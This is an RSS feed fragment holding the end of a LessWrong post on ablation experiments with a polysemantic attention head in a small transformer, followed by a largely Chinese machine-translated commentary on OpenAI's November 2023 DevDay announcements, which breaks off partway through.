srcset="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/tr75m7lkobqgiwi7edrb 110w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/oh9l0bhypz8qwpxi4rey 220w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/uttldkfsyqrqj0nhibvg 330w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/cjojrfvs2p5xjcyciv5c 440w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/s6lo5oyo3wbhe9t12adj 550w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/jvquqt48sshjwbktqkck 660w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/odlbmzvosycxq5sktxdx 770w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/ojo56n6nowtzqthvex86 880w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/gxbsrljpkdv82bqqnet1 990w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/qnssfoxhmfkijxitu4zx 1082w"></p><p> As earlier, over the 50 dataset examples, the clean run is associated with 100% of the 0th-rank tokens being the correct token as compared to 4% on the corrupted run. We also find that the mean probability of the correct token is 0.55 on the clean run and 0.11 on the corrupted run. </p><figure class="table"><table><tbody><tr><td style="border:1pt solid #000000;padding:5pt;vertical-align:top"></td><td style="border:1pt solid #000000;padding:5pt;vertical-align:top"><p> % of correct top prediction</p></td><td style="border:1pt solid #000000;padding:5pt;vertical-align:top"><p> mean probability of correct prediction </p></td></tr><tr><td style="background-color:#d9ead3;border:1pt solid #000000;padding:5pt;vertical-align:top"><p>clean </p></td><td style="background-color:#d9ead3;border:1pt solid #000000;padding:5pt;vertical-align:top"><p> 100% </p></td><td style="background-color:#d9ead3;border:1pt solid #000000;padding:5pt;vertical-align:top"><p> 0.55 </p></td></tr><tr><td style="background-color:#f4cccc;border:1pt solid #000000;padding:5pt;vertical-align:top"><p>ablated </p></td><td style="background-color:#f4cccc;border:1pt solid #000000;padding:5pt;vertical-align:top"><p> 4% </p></td><td style="background-color:#f4cccc;border:1pt solid #000000;padding:5pt;vertical-align:top"><p> 0.11</p></td></tr></tbody></table></figure><p> Again, we test the importance of different token positions by BOS-ablating all tokens in the prompt iteratively and recording the change in probability associated with the correct token. </p><figure class="image image_resized" style="width:79.12%"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/dhbmdc9ntwqeqijo3jc3"></figure><p></p><p> All tokens beside the indent token that are BOS-ablated at attention head 1.4 are only associated with negligible changes in the probability assigned to the correct token (the green tokens across the dataset). BOS-ablating the indent token and thus attention head 1.4&#39;s similar indentation token behaviour results in an approximate decrease of 40 percentage points assigned to the correct next token.</p><h3>以前的</h3><p>Finally, we study the importance of attention head 1.4&#39;s fuzzy previous token behaviour on the corresponding dataset, an example presented below. </p><p><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/tdcrfybo8hpqln2uwsyp" srcset="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/evuglhneyn3dkiftoqou 110w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/wx3z7i9ajqnyc1hodsce 220w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/otm1noprmgnjgilcgkfm 330w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/k1j0h798ikmutqv9jmn8 440w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/f7geduauep5paq08snzo 550w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/uavyedwcsduebioz5dwa 660w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/tbahrvtqrjgrreypbtuy 770w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/a7c59m97jsjcuykfmwls 880w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/ilzqxljquh9wld3vqcmv 990w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/h1atdmmpvhzkyzgf9kfo 1082w"><br> In this case, the clean run&#39;s 0th-rank token is always the correct token while this is true for only 80% of the corrupted runs on the dataset examples. The mean probability associated with the correct token for the clean run is 0.87 and 0.40 for the corrupted run. </p><figure class="table"><table><tbody><tr><td style="border:1pt solid #000000;padding:5pt;vertical-align:top"></td><td style="border:1pt solid #000000;padding:5pt;vertical-align:top"><p> % of correct top prediction</p></td><td style="border:1pt solid #000000;padding:5pt;vertical-align:top"><p> mean probability of correct prediction </p></td></tr><tr><td style="background-color:#d9ead3;border:1pt solid #000000;padding:5pt;vertical-align:top"><p>clean </p></td><td style="background-color:#d9ead3;border:1pt solid #000000;padding:5pt;vertical-align:top"><p> 100% </p></td><td style="background-color:#d9ead3;border:1pt solid #000000;padding:5pt;vertical-align:top"><p> 0.87 </p></td></tr><tr><td style="background-color:#f4cccc;border:1pt solid #000000;padding:5pt;vertical-align:top"><p>ablated </p></td><td style="background-color:#f4cccc;border:1pt solid #000000;padding:5pt;vertical-align:top"><p> 80% </p></td><td style="background-color:#f4cccc;border:1pt solid #000000;padding:5pt;vertical-align:top"><p> 0.40</p></td></tr></tbody></table></figure><p> As above, we iteratively BOS-ablate each token in prompts across the dataset and record the drop in probability assigned to the correct token. </p><figure class="image image_resized" style="width:76.65%"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/nuJFTS5iiJKT5G5yh/wxubd5uxcpcswwbjxt0z"></figure><p> The drop in the probability across all tokens besides the open bracket token is negligible, whereas this token is associated with a 45 percentage point drop when BOS-ablated.</p><h1>结论</h1><p>Our results suggest that head 1.4 in attn-only-4l exhibits multiple simple attention patterns that are relevant to model&#39;s performance. We believe the model is incentivized to use a single head for many purposes because it saves parameters. We are curious how these behaviours are implemented by the head, but we did not make meaningful progress trying to understand this mechanistically.</p><p> We believe the results are relevant to circuit analysis, because researchers often label attention heads based purely on its behaviour on a narrow task ( <a href="https://arxiv.org/abs/2211.00593">IOI</a> , <a href="https://www.alignmentforum.org/posts/u6KXXmKFbXfWzoAXn/a-circuit-for-python-docstrings-in-a-4-layer-attention-only">Docstring</a> , <a href="https://arxiv.org/abs/2307.09458">MMLU</a> ). <a href="https://arxiv.org/abs/2310.04625">Copy Suppression</a> is an exception.</p><p> We would like to thank <a href="https://www.lesswrong.com/users/yeu-tong-lau?mention=user">@Yeu-Tong Lau</a> and <a href="https://www.lesswrong.com/users/jacek?mention=user">@jacek</a> for feedback on the draft.</p><br/><br/> <a href="https://www.lesswrong.com/posts/nuJFTS5iiJKT5G5yh/polysemantic-attention-head-in-a-4-layer-transformer#comments">讨论</a>]]>;</description><link/> https://www.lesswrong.com/posts/nuJFTS5iiJKT5G5yh/polysemantic-attention-head-in-a-4-layer-transformer<guid ispermalink="false"> nuJFTS5iiJKT5G5yh</guid><dc:creator><![CDATA[Jett]]></dc:creator><pubDate> Thu, 09 Nov 2023 16:16:35 GMT</pubDate> </item><item><title><![CDATA[On OpenAI Dev Day]]></title><description><![CDATA[Published on November 9, 2023 4:10 PM GMT<br/><br/><p> <a href="https://openai.com/blog/new-models-and-developer-products-announced-at-devday" target="_blank" rel="noreferrer noopener">OpenAI DevDay</a>是在本周。有什么美味和/或可怕的东西在等待着呢？</p><span id="more-23581"></span><h4>涡轮增压</h4><p>首先，我们有 GPT-4-Turbo。</p><blockquote><p>今天，我们将推出该模型的下一代<a target="_blank" rel="noreferrer noopener" href="https://platform.openai.com/docs/models/gpt-4-and-gpt-4-turbo">GPT-4 Turbo</a>的预览。</p><p> GPT-4 Turbo 能力更强，了解截至 2023 年 4 月的世界事件。它具有 128k 上下文窗口，因此可以在单个提示中容纳相当于 300 多页文本的内容。我们还优化了其性能，因此与 GPT-4 相比，我们能够以<a target="_blank" rel="noreferrer noopener" href="https://openai.com/pricing#gpt-4-turbo">便宜 3 倍的</a>输入代币价格和便宜 2 倍的输出代币价格提供 GPT-4 Turbo。</p><p> GPT-4 Turbo 可供所有付费开发人员通过 API 中的<code>gpt-4-1106-preview</code>进行尝试，我们计划在未来几周内发布稳定的生产就绪模型。</p></blockquote><p>截至 2023 年 4 月的知识是一场大型游戏。将价格减半是另一场大游戏。 128k 上下文窗口重新领先于 Claude-2。上周的图表显示 GPT-4 如何缓慢且昂贵，为竞争对手打开了空间？大家回去工作吧。</p><p>还有什么？</p><blockquote><h3><strong>函数调用更新</strong></h3><p><a target="_blank" rel="noreferrer noopener" href="https://platform.openai.com/docs/guides/function-calling">函数调用</a>可让您向模型描述应用程序的函数或外部 API，并让模型智能地选择输出包含调用这些函数的参数的 JSON 对象。我们今天发布了几项改进，包括在一条消息中调用多个功能的能力：用户可以发送一条消息请求多个操作，例如“打开车窗并关闭空调”，这在以前需要多个操作模型往返（ <a target="_blank" rel="noreferrer noopener" href="https://platform.openai.com/docs/guides/function-calling/parallel-function-calling">了解更多</a>）。我们还提高了函数调用的准确性：GPT-4 Turbo 更有可能返回正确的函数参数。</p></blockquote><p>这种功能看起来非常繁琐和依赖。当它开始工作得足够好时，突然间它就很棒了，我不知道这是否算数。我会留意报道。目前，我不尝试通过 GPT-4 与任何 API 交互。谨慎使用。</p><blockquote><h3><strong>改进的指令跟随和 JSON 模式</strong></h3><p>在需要仔细遵循指令的任务上，GPT-4 Turbo 的表现比我们以前的模型更好，例如生成特定格式（例如，“始终以 XML 响应”）。它还支持我们新的<a target="_blank" rel="noreferrer noopener" href="https://platform.openai.com/docs/guides/text-generation/json-mode">JSON 模式</a>，这确保模型将使用有效的 JSON 进行响应。新的 API 参数<code>response_format</code>使模型能够限制其输出以生成语法正确的 JSON 对象。 JSON 模式对于开发人员在函数调用之外在聊天完成 API 中生成 JSON 非常有用。</p></blockquote><p>更好地遵循指令是渐进的伟大。当指示不可靠时总是令人沮丧。可以让某些流程实现自动化并盈利。</p><blockquote><h3><strong>可重复的输出和对数概率</strong></h3><p>新的<code>seed</code>参数使模型在大多数情况下返回一致<strong>的完成结果</strong>，从而实现可重复的输出。此测试版功能对于重播调试请求、编写更全面的单元测试以及通常对模型行为具有更高程度的控制等用例非常有用。我们 OpenAI 一直在内部使用此功能进行我们自己的单元测试，并发现它非常有价值。我们很高兴看到开发人员将如何使用它。 <a target="_blank" rel="noreferrer noopener" href="https://platform.openai.com/docs/guides/text-generation/reproducible-outputs">了解更多</a>。</p><p>我们还推出了一项功能，可在未来几周内返回 GPT-4 Turbo 和 GPT-3.5 Turbo 生成的最有可能的输出标记<strong>的日志概率</strong>，这对于构建搜索体验中的自动完成等功能非常有用。</p></blockquote><p>我喜欢定期查看不同响应的概率的想法，特别是如果合并到 ChatGPT 中。它提供了很多背景信息，让我们知道如何理解答案。可能答案的分布就是真实答案。以一种很好的方式超级兴奋。</p><blockquote><h3><strong>更新的 GPT-3.5 Turbo</strong></h3><p>除了 GPT-4 Turbo 之外，我们还发布了新版本的 GPT-3.5 Turbo，默认支持 16K 上下文窗口。新的 3.5 Turbo 支持改进的指令跟踪、JSON 模式和并行函数调用。例如，我们的内部评估显示，格式遵循任务（例如生成 JSON、XML 和 YAML）提高了 38%。开发者可以通过调用API中的<code>gpt-3.5-turbo-1106</code>来访问这个新模型。使用<code>gpt-3.5-turbo</code>名称的应用程序将于 12 月 11 日自动升级到新模型。在 2024 年 6 月 13 日之前，可以通过在 API 中传递<code>gpt-3.5-turbo-0613</code>继续访问旧模型。<a target="_blank" rel="noreferrer noopener" href="https://platform.openai.com/docs/models/gpt-3-5">了解更多</a>。</p></blockquote><p>一些学者可能会抱怨旧版本即将消失。这种增量改进看起来不错，但随着 GPT-4 降价和涡轮增压，对 3.5 的需求应该会减少。我仍然可以看到它在多智能体世界模拟等领域的应用。</p><p>与 Llama-2 相比，您现在可以<a target="_blank" rel="noreferrer noopener" href="https://twitter.com/EMostaque/status/1721678417739842004">以适度的额外边际成本使用 GPT 3.5</a> 。</p><blockquote><p> Hamel Husain：令人疯狂的是，GPT 3.5 的新定价与商业托管的 ~ 70B Llama 端点（例如 Anyscale 和<a href="http://fireworks.ai" rel="nofollow">http://fireworks.ai</a>提供的端点）相比具有竞争力。由于护城河 gpt-3.5-turbo-1106 的定价为 1/100 万美元的投入和 2/100 万美元的产出，成本正在被侵蚀。 [相对于每百万代币 0.15 和 0.20]</p></blockquote><p>我还没有那样解释这些数字。规模上仍然存在显着差异，相差五到六倍。如果您无法负担特定用例的高级 GPT-4，您可能需要额外折扣。随着所有成本的下降，将会有使用更多查询的诱惑。五的因数并不是什么都没有。</p><h4>新模式</h4><p>我将跳过一点，首先处理所有增量内容：</p><p>好吧，回到正常的不可怕的事情，有新的方式吗？</p><blockquote><h4> <strong>API 中的新模式</strong></h4><h3><strong>带视觉的 GPT-4 Turbo</strong></h3><p> GPT-4 Turbo 可以接受图像作为聊天完成 API 中的输入，从而实现生成标题、详细分析现实世界图像以及阅读带有图形的文档等用例。例如，BeMyEyes 使用这项技术帮助盲人或弱视人士完成日常任务，例如识别产品或浏览商店。开发人员可以通过 API 中的<code>gpt-4-vision-preview</code>来访问此功能。我们计划为主要的 GPT-4 Turbo 模型提供视觉支持，作为其稳定版本的一部分。<a target="_blank" rel="noreferrer noopener" href="https://openai.com/pricing">定价</a>取决于输入图像的大小。例如，将 1080×1080 像素的图像传递给 GPT-4 Turbo 的成本为 0.00765 美元。查看 <a target="_blank" rel="noreferrer noopener" href="https://platform.openai.com/docs/guides/vision">我们的愿景指南</a>。</p><h3><strong>达尔·E 3</strong></h3><p>开发人员可以通过我们的图像 API 将 DALL·E 3（我们<a target="_blank" rel="noreferrer noopener" href="https://openai.com/blog/dall-e-3-is-now-available-in-chatgpt-plus-and-enterprise">最近向 ChatGPT Plus 和企业用户推出</a>）直接集成到他们的应用程序和产品中，并将<code>dall-e-3</code>指定为模型。 Snap、可口可乐和 Shutterstock 等公司已使用 DALL·E 3 以编程方式为其客户和活动生成图像和设计。与之前版本的 DALL·E 类似，该 API 包含内置审核功能，可帮助开发人员保护其应用程序免遭滥用。我们提供不同的格式和质量选项，每生成一张图像的起价为 0.04 美元。查看我们的 API 中的 DALL·E 3 <a target="_blank" rel="noreferrer noopener" href="https://platform.openai.com/docs/guides/images">入门指南</a>。</p><h3><strong>文本转语音 (TTS)</strong></h3><p>开发人员现在可以通过文本转语音 API 从文本生成人类质量的语音。我们的新 TTS 模型提供六种预设声音可供选择以及两种模型变体： <code>tts-1</code>和<code>tts-1-hd</code> 。 <code>tts</code>针对实时用例进行了优化， <code>tts-1-hd</code>针对质量进行了优化。每输入 1,000 个字符起价为 0.015 美元。查看我们的<a target="_blank" rel="noreferrer noopener" href="https://platform.openai.com/docs/guides/text-to-speech">TTS 指南</a>以开始使用。</p></blockquote><p>我可以看到 DALL-E 3 的价格加起来就是实际的钱。当我使用稳定扩散时，我要求满 100 代，然后离开一段时间再回来，这并不罕见，为什么不呢？当然，如果 DALL-E 3 愿意做我那天想做的任何事情，那么为了质量的提升是值得的。文本转语音似乎不是免费的，但价格非常合理。所有的声音似乎都出奇地相似。我确实喜欢他们。我们什么时候可以获得授权的名人配音选项？有很多不错的选择。</p><blockquote><h2><strong>型号定制</strong></h2><h3><strong>GPT-4微调实验接入</strong></h3><p>我们正在创建一个用于<strong>GPT-4 微调的</strong>实验性访问程序。初步结果表明，与 GPT-3.5 微调实现的实质性收益相比，GPT-4 微调需要更多的工作才能对基本模型实现有意义的改进。随着 GPT-4 微调的质量和安全性的提高，积极使用 GPT-3.5 微调的开发人员将可以选择在其<a target="_blank" rel="noreferrer noopener" href="https://platform.openai.com/finetune">微调控制台</a>中应用到 GPT-4 程序。</p></blockquote><p>好吧，当然，我想现在是时候了，改进变得更加困难是有道理的。如果您想要更古怪的东西，想必会更容易。我不知道微调如何防止越狱尝试，有人想解释一下吗？</p><blockquote><h3><strong>定制型号</strong></h3><p>对于需要比微调所能提供的更多自定义的组织（特别适用于具有极大专有数据集的域 - 至少数十亿个代币），我们还启动了<strong>自定义模型计划</strong>，为选定的组织提供了与专门的 OpenAI 研究人员小组将定制 GPT-4 训练到其特定领域。这包括修改模型训练过程的每一步，从进行额外的特定领域预训练，到运行针对特定领域定制的自定义强化学习后训练过程。组织将拥有对其定制模型的独家访问权。根据我们现有的企业隐私政策，自定义模型不会提供给其他客户或与其他客户共享，也不会用于训练其他模型。此外，提供给 OpenAI 用于训练自定义模型的专有数据不会在任何其他环境中重复使用。这将是一个非常有限（且昂贵）的启动计划，有兴趣的组织可以<a target="_blank" rel="noreferrer noopener" href="https://openai.com/form/custom-models">在此处申请</a>。</p></blockquote><p>昂贵大概是口号。这并不便宜。话又说回来，与<a target="_blank" rel="noreferrer noopener" href="https://tvtropes.org/pmwiki/pmwiki.php/Main/JustThinkOfThePotential#:~:text=Just%20Think%20of%20the%20Potential%20is%20a%20trope%20often%20used,antagonist%2C%20such%20as%20a%20corporation.">潜力</a>相比，确实可能非常便宜。</p><p>到目前为止，如此渐进，你喜欢看到它，然后……等等，什么？</p><h4><strong>助手 API、检索和代码解释器</strong></h4><blockquote><p>今天，我们发布了<a target="_blank" rel="noreferrer noopener" href="https://platform.openai.com/docs/assistants/overview">Assistants API</a> ，这是我们帮助开发人员在自己的应用程序中构建类似代理的体验的第一步。助手是一种专门构建的人工智能，具有特定的指令，利用额外的知识，并且可以调用模型和工具来执行任务。新的 Assistants API 提供了代码解释器和检索以及函数调用等新功能，可以处理您以前必须自己完成的大量繁重工作，并使您能够构建高质量的 AI 应用程序。</p><p>这个 API 的设计是为了灵活性；用例范围包括基于自然语言的数据分析应用程序、编码助手、人工智能驱动的假期规划器、语音控制的 DJ、智能视觉画布——这样的例子不胜枚举。 Assistants API 构建于支持<a target="_blank" rel="noreferrer noopener" href="http://openai.com/blog/introducing-gpts">我们新 GPT 产品的</a>相同功能之上：自定义指令和工具，例如代码解释器、检索和函数调用。</p><p>该 API 引入的一个关键变化是<strong>持久且无限长的线程</strong>，它允许开发人员将线程状态管理移交给 OpenAI 并解决上下文窗口约束。使用 Assistants API，您只需将每条新消息添加到现有<code>thread</code>即可。</p><p>助理还可以根据需要调用新工具，包括：</p><ul><li><strong>代码解释器</strong>：在沙盒执行环境中编写和运行Python代码，可以生成图形和图表，并处理具有不同数据和格式的文件。它允许您的助手迭代运行代码来解决具有挑战性的代码和数学问题等等。</li><li><strong>检索</strong>：利用我们模型之外的知识来增强助手，例如专有领域数据、产品信息或用户提供的文档。这意味着您不需要计算和存储文档的嵌入，或实现分块和搜索算法。 Assistants API 根据我们在 ChatGPT 中构建知识检索的经验，优化了要使用的检索技术。</li><li><strong>函数调用</strong>：使助手能够调用您定义的函数并将函数响应合并到其消息中。</li></ul><p>与平台的其他部分一样，传递到 OpenAI API 的数据和文件<a target="_blank" rel="noreferrer noopener" href="https://openai.com/enterprise-privacy">永远不会用于训练我们的模型</a>，开发人员可以在认为合适时删除数据。</p><p>您可以前往<a target="_blank" rel="noreferrer noopener" href="https://platform.openai.com/playground?mode=assistant">Assistants Playground</a>来尝试 Assistants API 测试版，而无需编写任何代码。</p></blockquote><p><a target="_blank" rel="noreferrer noopener" href="https://thezvi.substack.com/p/on-autogpt">距离我写 On AutoGPT</a>已经有几个月了，每个人都很兴奋。所有围绕特工的炒作都消失了，每个人似乎都对让他们在当前的模特一代中发挥作用感到绝望。 OpenAI 在很多方面都有内线，所以也许他们让它运作得更好？我们会找出答案。如果你一点也不紧张，那似乎是个错误。</p><h4> GPT-GPT</h4><p><a target="_blank" rel="noreferrer noopener" href="https://openai.com/blog/introducing-gpts">好吧，这些“GPT”怎么了？</a></p><p>首先，可怕的名字，非常混乱，请修复。唉，他们不会。</p><p>好吧，我们得到了什么？</p><p>啊，我们应该做的显而易见的事情之一，这将带来大量的可能性，我很遗憾我没有明确地说出来并获得零信用，但我们都在思考这一点。</p><blockquote><p>我们正在推出 ChatGPT 的自定义版本，您可以为特定目的创建该版本，称为 GPT。 GPT 是一种新方式，任何人都可以创建 ChatGPT 的定制版本，以便在日常生活、特定任务、工作或家庭中更有帮助，然后与其他人分享该创作。例如，GPT 可以帮助您<a target="_blank" rel="noreferrer noopener" href="https://openai.com/chatgpt#do-more-with-gpts">学习任何棋盘游戏的规则、帮助教您的孩子数学或设计贴纸</a>。</p><p>任何人都可以轻松构建自己的 GPT——无需编码。您可以为自己制作它们，仅供公司内部使用，或为每个人制作。创建一个就像开始对话一样简单，给它指令和额外的知识，然后选择它能做什么，比如搜索网络、制作图像或分析数据。</p><p>示例 GPT 现已可供 ChatGPT Plus 和企业用户试用，包括<a target="_blank" rel="noreferrer noopener" href="https://chat.openai.com/g/g-alKfVrz9K-canva">Canva</a>和<a target="_blank" rel="noreferrer noopener" href="https://zapier.com/blog/gpt-assistant/">Zapier AI Actions</a> 。我们计划很快向更多用户提供 GPT。</p></blockquote><p>会有一个<s>应用程序</s>GPT 商店，你的隐私是安全的，如果你感觉很活跃，你可以连接你的 API，然后也许注意是安全的。 <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/OpenAI/status/1721594380669342171">这是一个长达一分钟的 Puppy Hotline 演示</a>，这是一个奇怪的例子，因为我不确定为什么所有这些都不能正常工作。</p><p>一个逐渐更好的例子是<a target="_blank" rel="noreferrer noopener" href="https://twitter.com/paulg/status/1721844540833685508">萨姆·奥尔特曼（Sam Altman）创建的“创业导师”</a> ，他向用户询问为什么他们没有更快地成长。再次强调，这在功能上是 LLM、GPT 的配置，而不是代理的配置。也许它可能包括一些 if-then 语句。这一切都很好，这些都是我们想要的东西，而且看起来并不危险。</p><p>泰勒·考恩的《山羊》是另一个例子。作者可以上传一本书加上一些说明，突然你就可以与书聊天，花费几分钟到几小时的时间。</p><p>教育的可能性本身就可以写出来。这个过程非常快，您可以每天为孩子的家庭作业创建一个，或者为自己创建一个，花一个小时学习一些东西。</p><p>我希望有人进行的一个实验是尝试用它来教某人一门外语。 <a target="_blank" rel="noreferrer noopener" href="https://www.astralcodexten.com/p/quests-and-requests">考虑一下斯科特·亚历山大提出的实验</a>，你从英语开始，然后随着时间的推移逐渐转向日语语法和词汇。现在考虑使用 GPT 来做到这一点，因为您无论如何都可以做您正在做的事情，并且您可以暂停并询问是否有任何令人困惑的地方，并且您也可以以混合方式回复。</p><p>未来使用 ChatGPT 的正确方法可能是遵循程序员的格言，即如果您执行三次，则应该将其自动化，但现在阈值可能是 2，如果某件事不平凡，它也可能是 1。您可以使用其他人的版本，但如果过程很简单，那么滚动自己的版本就有很多可说的了。当然，如果效果足够好的话。但如果是这样，游戏规则就会改变。</p><p>不言而喻，如果您可以将其与删除成人内容过滤结合起来，特别是如果您仍然有图像生成和音频，但即使没有它们，这将是各种需求非常高的产品。</p><p> <a target="_blank" rel="noreferrer noopener" href="https://www.oneusefulthing.org/p/almost-an-agent-what-gpts-can-do">Ethan Mollick 这样总结了 GPT 的初始状态</a>：</p><blockquote><ul><li>目前，GPT 是共享结构化提示的最简单方法，结构化提示是用简单英语（或其他语言）编写的程序，可以让人工智能做有用的事情。 <a target="_blank" rel="noreferrer noopener" href="https://www.oneusefulthing.org/p/working-with-ai-two-paths-to-prompting">我上周讨论了创建结构化提示，所有相同的技术都适用</a>，但 GPT 系统使结构化提示更加强大，并且更容易创建、测试和共享。我认为这将有助于解决一些最重要的人工智能用例（我如何让学校、组织或社区中的人们访问良好的人工智能工具？）</li><li> GPT 展示了在不久的将来，人工智能可以真正开始充当代理，因为这些 GPT 能够连接到其他产品和服务，从电子邮件到购物网站，使人工智能能够执行广泛的任务。因此，GPT 是下一波人工智能浪潮的先驱。</li><li>他们还提出了未来新的漏洞和风险。随着人工智能连接到更多的系统，并开始更加自主地行动，它们被恶意使用的机会就会增加。</li></ul><p> ……</p><p>制作 GPT 的简单方法是称为 GPT Builder。在这种模式下，AI通过对话帮助你创建一个GPT。您还可以在界面侧面的窗口中测试结果并要求实时更改，从而创建一种迭代和改进工作的方法。</p><p> ……</p><p>在幕后，根据我的对话，AI 正在填写 GPT 的详细配置，我也可以手动编辑该配置。</p><p> ……</p><p>要真正构建一个出色的 GPT，您需要自己修改或构建结构化提示。</p></blockquote><p>与往常一样，可靠性并不完美，错误往往是无声无息的，警告不要假设或依赖 GPT 会正确吸收细节。</p><blockquote><p>这里也是同样的情况。 GPT 中的文件参考系统非常强大，但并非完美无缺。例如，我为一个极其复杂的游戏输入了 7 个 PDF 中的 1,000 多页规则，人工智能能够很好地弄清楚规则，引导我完成入门过程，并掷骰子来帮助我设置一个角色。人类要努力实现这一切。但它也弥补了一些游戏中没有的细节，并且完全遗漏了其他要点。我没有收到任何关于这些错误发生的警告，如果我自己没有交叉引用规则，我也不会注意到它们。</p></blockquote><p>我现在完全被淹没了。一旦获得访问权限，我也很高兴能够进行构建。</p><p>唉，现在<a target="_blank" rel="noreferrer noopener" href="https://twitter.com/sama/status/1722315204242149788">还得继续等</a>。</p><blockquote><p> Sam Altman（11 月 8 日）：devday 新功能的使用情况远远超出了我们的预期。我们计划周一为所有订阅者启用 GPT，但仍然未能实现。我们希望尽快。由于负载的原因，短期内可能会出现服务不稳定的情况。对不起 ：/</p></blockquote><figure class="wp-block-image"> <a href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F840c0117-8a30-44d0-99b9-1ef8bf1a3971_734x390.png" target="_blank" rel="noreferrer noopener"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/wdekcGpsMtakGCo5y/fcjdfbr6ardmxq7vrb5o" alt="图像"></a></figure><blockquote><p> Kevin Fischer：我喜欢想象这是 GPT 的诞生。</p></blockquote><p>幸运的是，这显然不是正在发生的事情，但郑重声明，我不喜欢想象这种情况，因为我喜欢活着。</p><p>将会有很多很酷的事情。还有很多东西渴望变得很酷，声称它们会很酷，但实际上并不酷。</p><blockquote><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/charles_irl/status/1722325576953065599">Charles Frye</a> ：希望我的担心被证明是错误的，因为我担心“GPT”将使该技术作为虚假演示软件的声誉提高 100 倍。</p><p> Vivek Ponnaiyan：这将是像苹果应用商店一样的长尾动态。</p></blockquote><p>代理人是实用性主张消失的地方。即使其中一些开始发挥作用，预计还会有大量死亡发生。</p><h4>把它们放在一起</h4><p>从演示来看，他们似乎将为 ChatGPT 用户提供版权保护，以防他们被起诉。这似乎是一个非常SBF 风格的时刻？这是一个好主意，除非它可能会摧毁你的整个公司，但这完全不会发生，对吗？</p><p>这是否会像微软将功能融入 Windows 那样杀死一批初创企业？是的。这是一件好事，新的方式对每个人都更好，是时候去构建其他东西了。应该提前计划好。</p><blockquote><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/Lauramaywendel/status/1721928498581782850">劳拉·温德尔</a>：新的有毒关系刚刚结束</p></blockquote><figure class="wp-block-image"><a href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbbba3385-0c2b-4070-a6e7-0bd2e4077f58_1245x1385.jpeg" target="_blank" rel="noreferrer noopener"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/wdekcGpsMtakGCo5y/oohxeztn3jxqreipg4ns" alt="图像"></a></figure><blockquote><p> Brotzky：所有关于 OpenAI 每次发布新版本都会杀死初创公司的笑话都有一定道理。</p><p>我们刚刚从代码库中删除了 Pinecone 和 Langchain，从而降低了每月的费用并消除了很多复杂性。</p><p>新的 Assistants API 非常棒<img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/fXnpnrazqwpJmbadu/bc1z8zeepb85dkj1wtbx" alt="✨" style="height:1em;max-height:1em"></p><p>缺点：必须轮询运行端点以获得结果。</p><p>一些注意事项</p><p>– 我们的用例很“简单”，助手 api 非常适合我们</p><p>– 我们还没有使用代理</p><p>– 我们大量使用文件 期待所有这些人工智能竞争降低成本。</p><p> Sam Hogan：刚刚测试了 OpenAI 的新 Assistant API。</p><p>现在，这是创建在整个网站上训练的自定义 ChatGPT 所需的全部代码。</p><p>少于30行<img 